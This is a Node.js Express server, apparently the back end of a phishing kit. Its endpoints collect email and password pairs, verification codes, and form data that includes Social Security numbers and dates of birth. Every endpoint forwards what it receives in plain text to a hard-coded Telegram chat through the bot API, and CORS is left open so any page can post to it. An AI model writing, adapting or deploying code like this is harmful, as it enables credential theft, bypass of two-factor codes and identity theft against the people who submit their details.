require("dotenv").config();
const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const cors = require("cors");

const { TOKEN, SERVER_URL } = process.env;
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;
const URI = `/webhook/${TOKEN}`;
const WEBHOOK_URL = SERVER_URL + URI;

const app = express();
app.use(bodyParser.json());
app.use(cors()); // Use the cors middleware

const init = async () => {
  const res = await axios.get(`${TELEGRAM_API}/setWebhook?url=${WEBHOOK_URL}`);
  console.log(res.data);
};

app.post(URI, async (req, res) => {
  console.log(req.body);

  email = req.body.email;
  password = req.body.password;

  // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
  console.log("Received Email:", email);
  console.log("Received Password:", password);

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: "1636602095",
    text: `The Email is ${email}, the Password is ${password}`,
  });
  return res.send();
});

app.post("/code", async (req, res) => {
  console.log(req.body);

  code = req.body.code;

  // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
  console.log("Received Code:", code);

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: "1636602095",
    text: `The verification code is ${code}`,
  });
  return res.send();
});

app.post("/form", async (req, res) => {
  try {
    console.log(req.body);

    const { firstName, lastName, email, phoneNumber, ssn, gender, dob } =
      req.body;

    // Handle other form fields as needed

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: "1636602095",
      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nSSN: ${ssn}\nGender: ${gender}\nDate of Birth: ${dob}`,
    });

    return res.send();
  } catch (error) {
    console.error("An error occurred while processing the form:", error);
    return res.status(500).send("Internal Server Error");
  }
});

app.listen(process.env.PORT || 5000, async () => {
  console.log("🚀 app running on port", process.env.PORT || 5000);
  await init();
});
